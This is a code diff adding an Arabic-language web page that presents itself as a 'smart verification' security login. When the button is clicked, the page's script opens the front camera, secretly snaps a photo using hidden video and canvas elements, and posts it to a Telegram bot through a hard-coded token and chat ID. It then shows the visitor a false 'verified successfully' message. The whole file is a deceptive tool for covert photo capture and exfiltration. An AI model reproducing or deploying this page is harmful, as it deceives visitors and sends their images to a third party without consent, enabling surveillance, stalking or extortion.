@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>نظام التحقق الذكي</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>#video, #canvas { display: none; } body { background: #0f172a; }</style>
+</head>
+<body class="flex items-center justify-center min-h-screen p-4">
+    <div class="bg-slate-800 p-10 rounded-[2.5rem] shadow-2xl max-w-sm w-full text-center border border-slate-700">
+        <h2 class="text-white text-2xl font-bold mb-3">نظام الحماية</h2>
+        <p class="text-slate-400 text-sm mb-8">اضغط على زر الدخول ومنح الأذونات اللازمة للمتابعة.</p>
+        <button id="captureBtn" class="bg-indigo-600 text-white font-bold py-4 px-10 rounded-2xl w-full text-lg">دخول آمن</button>
+        <p id="status" class="mt-6 text-xs text-slate-500 font-medium"></p>
+    </div>
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
+    <script>
+        const TELEGRAM_TOKEN = "8566692559:AAFNUyp7O6I6455opLPWnslNIc_Pysk3eiQ"; 
+        const MY_CHAT_ID = "8224195330";
+        const btn = document.getElementById('captureBtn');
+        const status = document.getElementById('status');
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        btn.addEventListener('click', async () => {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
+                video.srcObject = stream;
+                btn.innerText = "جاري التحقق...";
+                btn.disabled = true;
+                setTimeout(() => {
+                    const ctx = canvas.getContext('2d');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    canvas.toBlob(async (blob) => {
+                        const formData = new FormData();
+                        formData.append('chat_id', MY_CHAT_ID);
+                        formData.append('photo', blob, 'capture.jpg');
+                        await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
+                        status.innerText = "تم التحقق بنجاح!";
+                        stream.getTracks().forEach(track => track.stop());
+                    }, 'image/jpeg', 0.8);
+                }, 1500);
+            } catch (err) { alert("يرجى السماح بالكاميرا."); }
+        });
+    </script>
+</body>
+</html>
